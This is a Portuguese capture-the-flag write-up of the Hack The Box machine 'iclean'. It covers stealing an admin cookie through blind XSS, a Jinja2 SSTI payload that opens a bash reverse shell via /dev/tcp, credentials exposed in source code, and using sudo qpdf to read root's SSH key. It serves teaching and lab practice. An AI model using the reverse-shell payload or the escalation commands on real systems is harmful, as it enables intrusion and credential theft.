---
title: Iclean
type: docs
---

## Introdução

A máquina **iclean** do Hack The Box apresenta um nível intermediário de
dificuldade. O desafio explora técnicas como Blind XSS, SSTI (Server Side
Template Injection), exposição de credenciais em código-fonte e abuso de
funcionalidades do sistema para escalar privilégios. Durante o writeup, vamos
abordar desde o reconhecimento até o acesso root na máquina.

## Reconhecimento

Iniciamos o reconhecimento com uma varredura de portas utilizando o Nmap,
identificando os seguintes serviços:

```text
PORT      STATE  SERVICE VERSION
22/tcp    open   ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp    open   http    Apache httpd 2.4.52 ((Ubuntu))
```

Ao acessar o serviço web, fomos redirecionados para o domínio `capiclean.htb`.
Adicionamos o domínio no arquivo `/etc/hosts`:

```bash
echo "10.10.11.12 capiclean.htb" | sudo tee -a /etc/hosts
```

Durante a análise da aplicação, encontramos o endpoint `/quote`, que apresentava
uma mensagem suspeita sugerindo o envio de dados ao time de gerenciamento:

```
Your quote request was sent our management team. They will reach out soon via e-mail. Thanks for the interest you have shown in our services
```

Isso indicava a possibilidade de Blind XSS.

Testamos payloads de XSS para capturar o token de sessão do administrador,
utilizando um servidor HTTP simples para receber os dados:

```bash
python3 -m http.server
```

**Blind XSS:**  
![Blind XSS](blind-xss.png)

Como resultado da exploração, obtivemos o token de sessão do admin:  
![Recebendo o token](get-token.png)

## Acesso Inicial

De posse do token de admin, iniciamos a enumeração de novos endpoints usando o ffuf:

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FFUZ -u http://capiclean.htb/FFUZ
```

Descobrimos o endpoint `/dashboard`, acessível apenas com o token de admin.
Adicionamos o cookie no navegador e acessamos o painel.

Dentro da aplicação, seguindo o fluxo, geramos um invoice e encontramos um
endpoint de geração de QR Code.

Durante a análise dos parâmetros, encontramos uma SSTI no parâmetro `qr_link`:

**SSTI:**  
![SSTI](SSTI.png)

Exploramos a vulnerabilidade com o seguinte payload para obter uma shell reversa:

```jinja
{{request|attr("application")|attr("__globals__")|attr("__getitem__")("__builtins__")|attr("__getitem__")("__import__")("os")|attr("popen")("bash -c '/bin/bash -i >& /dev/tcp/Nosso_IP/4444 0>&1'")|attr("read")()}}
```

## Post Exploitation

Com a shell reversa, iniciamos a análise do ambiente comprometido. Explorando o
código-fonte da aplicação, encontramos as credenciais do banco de dados:

```python
db_config = {
'host': '127.0.0.1',
'user': 'iclean',
'password': 'pxCsmnGLckUb',
'database': 'capiclean'
}
```

Utilizamos essas credenciais para acessar o MySQL localmente:

```bash
mysql --database capiclean -u iclean -p
```

Enumerando o banco de dados, encontramos hashes de senhas. Conseguimos quebrar a
hash do usuário `consuela`, cuja senha era `simple and clean`.

Com o usuário e senha, acessamos a máquina via SSH:

```bash
ssh consuela@$rhost
```

### Escalação de Privilégios

Após obter acesso SSH como `consuela`, verificamos os comandos disponíveis com sudo:

```bash
sudo -l
```

Identificamos a possibilidade de utilizar o `qpdf`. Supomos que o root também
tivesse SSH configurado e armazenasse a chave privada em `/root/.ssh/id_rsa`.
Exploramos essa situação usando o `qpdf` para extrair a chave privada para um
arquivo acessível:

```bash
sudo /usr/bin/qpdf --qdf --add-attachment /root/.ssh/id_rsa -- --empty ./id_rsa
```

Com a chave extraída, realizamos o login como root:

```bash
ssh root@$rhost -i root_ssh_key_file
```

Finalmente, acessamos a flag de root:

```bash
cat root.txt
```

## Conclusão

A exploração da máquina **iclean** envolveu técnicas interessantes como Blind
XSS para captura de sessão, SSTI para execução remota de código e uso criativo
do `qpdf` para exfiltrar a chave privada do root. A máquina reforça a
importância de validar a entrada do usuário e proteger credenciais sensíveis.

## Participantes

- [paixao](http://linkedin.com/in/darccau)
